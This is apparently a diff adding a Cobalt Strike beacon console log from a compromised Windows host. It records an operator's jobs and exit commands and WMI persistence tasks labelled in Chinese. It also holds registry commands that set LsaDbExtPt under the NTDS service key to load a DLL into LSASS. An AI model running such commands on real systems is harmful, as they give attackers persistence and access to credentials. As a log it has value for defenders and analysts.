@@ -1,0 +1,23 @@
+01/27 10:58:04 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 2672; os: Windows; version: 6.1; beacon arch: x86 (x64)
+01/27 10:58:15 [task] 4*************LSA Disver************
+01/27 10:58:15 [task] 执行代码
+01/27 10:59:04 [checkin] host called home, sent: 326 bytes
+01/27 10:59:04 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
+01/27 10:59:04 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
+01/27 11:34:53 [input] <neo> job
+01/27 11:34:53 [error] Unknown command: job
+01/27 11:34:55 [input] <neo> jobs
+01/27 11:34:55 [task] Tasked beacon to list jobs
+01/27 11:37:29 [input] <neo> kill
+01/27 11:37:29 [error] kill error: not enough arguments
+01/27 14:06:23 [task] 4*************进行WMI启动**********
+01/27 14:06:23 [task] 删除WMI
+01/27 14:06:23 [task] 4********WMI已启动,测试后需删除**********
+01/27 14:07:01 [task] 4*************进行WMI启动**********
+01/27 14:07:01 [task] 启动WMI
+01/27 14:07:01 [task] 4********WMI已启动,测试后需删除**********
+01/27 14:09:00 [task] 4*************进行WMI启动**********
+01/27 14:09:00 [task] 启动WMI
+01/27 14:09:00 [task] 4********WMI已启动,测试后需删除**********
+01/27 14:11:22 [input] <neo> exit
+01/27 14:11:22 [task] Tasked beacon to exit
